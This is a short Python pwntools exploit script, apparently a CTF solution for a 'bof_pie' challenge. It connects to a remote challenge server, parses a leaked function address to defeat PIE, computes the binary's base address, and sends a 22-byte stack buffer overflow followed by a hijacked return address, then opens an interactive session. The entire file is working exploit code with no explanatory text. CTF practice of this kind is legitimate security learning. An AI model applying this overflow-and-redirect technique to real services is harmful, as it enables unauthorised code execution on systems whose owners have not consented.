from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./bof_pie")
#p = process("./bof_pie")
r = remote("ctf.j0n9hyun.xyz", 3008)
welcome_offset = 0x909
j0n9hyun_offset = 0x890

print r.recvline()
print r.recvuntil("j0n9hyun is ")
j0n9hyun = int(r.recv(10), 16)
print hex(j0n9hyun)
base_addr = j0n9hyun - welcome_offset
print "base_addr : ",hex(base_addr)

payload = ''
payload += "A"*22
payload += p32(base_addr + j0n9hyun_offset)
r.sendline(payload)
r.interactive()
